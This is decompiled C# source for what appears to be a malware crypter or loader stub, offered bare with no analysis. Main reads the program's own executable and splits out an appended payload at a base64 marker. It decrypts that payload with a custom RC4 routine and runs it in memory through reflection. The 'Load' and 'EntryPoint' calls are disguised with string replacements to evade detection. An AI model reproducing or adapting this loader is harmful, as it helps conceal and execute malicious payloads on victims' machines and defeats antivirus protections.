using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class8
{
	private static string[] string_0;

	private static byte[] byte_0;

	public static void smethod_0()
	{
		string_0 = Strings.Split(File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName), "dABoAGEAZQByAFQAZQBEAGQARAB5AFQAaQBuAGkARgBpAA==", -1, (CompareMethod)0);
		byte_0 = smethod_2(Convert.FromBase64String(string_0[1]), "aAB0AGEAZQBEAHkAdABpAG4AaQBmAG4ASQA=");
		Encoding.GetEncoding(1252).GetBytes(string_0[1]);
	}

	public static void smethod_1()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Versioned.CallByName((object)AppDomain.CurrentDomain, "lrad".Replace("r", "o"), (CallType)1, new object[1] { byte_0 }));
		object objectValue2 = RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(objectValue), "EntryPoidt".Replace("d", "n"), (CallType)2, new object[0]));
		RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(objectValue2), "Invoke", (CallType)1, new object[2]));
	}

	[STAThread]
	public static void Main()
	{
		smethod_0();
		smethod_1();
	}

	public static byte[] smethod_2(byte[] byte_1, string string_1)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		uint[] array = new uint[256];
		checked
		{
			byte[] array2 = new byte[byte_1.Length - 1 + 1];
			int num = 0;
			do
			{
				array[num] = (uint)num;
				num++;
			}
			while (num <= 255);
			int num2 = 0;
			uint num3 = default(uint);
			do
			{
				num3 = (uint)(unchecked((long)checked(num3 + bytes[unchecked(num2 % bytes.Length)] + array[num2])) & 0xFFL);
				uint num4 = array[num2];
				array[num2] = array[(int)num3];
				array[(int)num3] = num4;
				num2++;
			}
			while (num2 <= 255);
			uint num5 = 0u;
			num3 = 0u;
			int num6 = array2.Length - 1;
			for (int i = 0; i <= num6; i++)
			{
				num5 = (uint)((unchecked((long)num5) + 1L) & 0xFFL);
				num3 = (uint)(unchecked((long)checked(num3 + array[(int)num5])) & 0xFFL);
				uint num4 = array[(int)num5];
				array[(int)num5] = array[(int)num3];
				array[(int)num3] = num4;
				array2[i] = (byte)(byte_1[i] ^ array[(int)(unchecked((long)checked(array[(int)num5] + array[(int)num3])) & 0xFFL)]);
			}
			return array2;
		}
	}
}
